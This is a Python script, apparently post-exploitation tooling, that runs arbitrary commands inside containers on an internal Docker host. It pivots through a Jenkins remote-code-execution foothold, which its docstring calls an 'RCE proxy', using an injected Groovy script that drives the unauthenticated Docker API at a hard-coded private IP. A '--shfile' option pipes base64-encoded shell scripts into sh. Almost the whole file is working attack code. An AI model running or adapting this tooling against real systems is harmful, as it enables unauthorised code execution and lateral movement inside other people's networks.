"""
Exec a command in an existing container on the remote docker host (via Jenkins RCE proxy).
Usage:
  python docker_exec.py <container_id_or_name> <cmd...>
"""
import sys, os, json, subprocess, tempfile, shlex

HERE = os.path.dirname(os.path.abspath(__file__))
JENKINS_EXEC = os.path.join(HERE, "jenkins_exec.py")
DOCKER_HOST = "172.27.140.148:4243"

GROOVY = r'''
import groovy.json.JsonBuilder
import groovy.json.JsonSlurper

def http(String method, String path, Object body, int readTimeout) {
    def c = new URL("http://__DOCKER__" + path).openConnection()
    c.setConnectTimeout(15000)
    c.setReadTimeout(readTimeout)
    c.setRequestMethod(method)
    if (body != null) {
        c.setDoOutput(true)
        c.setRequestProperty("Content-Type", "application/json")
        c.getOutputStream().write(new JsonBuilder(body).toString().getBytes("UTF-8"))
    }
    int code = c.getResponseCode()
    String text = ""
    try { text = c.getInputStream().getText("UTF-8") } catch (e) {
        try { text = c.getErrorStream()?.getText("UTF-8") ?: "" } catch (ignored) {}
    }
    return [code: code, body: text]
}

def execConf = [
    AttachStdout: true,
    AttachStderr: true,
    Tty: false,
    Cmd: new JsonSlurper().parseText('__CMD_JSON__')
]

def created = http("POST", "/containers/__CONTAINER__/exec", execConf, 30000)
println "EXEC_CREATE_CODE=" + created.code
if (created.code != 201) { println created.body; return }
def eid = new JsonSlurper().parseText(created.body).Id
println "EID=" + eid

def started = http("POST", "/exec/" + eid + "/start", [Detach: false, Tty: false], 110000)
println "EXEC_START_CODE=" + started.code
println "OUTPUT_BEGIN"
println started.body
println "OUTPUT_END"
'''


def exec_container(container, cmd, timeout=180):
    def groovy_sq(s):
        return s.replace("\\", "\\\\").replace("'", "\\'")
    script = (GROOVY
              .replace("__DOCKER__", DOCKER_HOST)
              .replace("__CONTAINER__", container)
              .replace("__CMD_JSON__", groovy_sq(json.dumps(cmd))))
    with tempfile.NamedTemporaryFile("w", suffix=".groovy", delete=False, dir=HERE, encoding="utf-8") as f:
        f.write(script)
        tmp = f.name
    try:
        out = subprocess.run([sys.executable, JENKINS_EXEC, tmp], capture_output=True, timeout=timeout)
        return out.stdout.decode("utf-8", errors="replace") + out.stderr.decode("utf-8", errors="replace")
    finally:
        os.unlink(tmp)


if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) < 2:
        print(__doc__)
        sys.exit(1)
    container = args[0]
    cmd = args[1:]
    if cmd and cmd[0] == "--shfile":
        import base64
        with open(cmd[1], "rb") as fh:
            b64 = base64.b64encode(fh.read()).decode()
        cmd = ["sh", "-c", f"echo {b64} | base64 -d | sh"]
    elif len(cmd) == 1:
        cmd = shlex.split(cmd[0])
    result = exec_container(container, cmd)
    sys.stdout.buffer.write(result.encode("utf-8", errors="replace"))
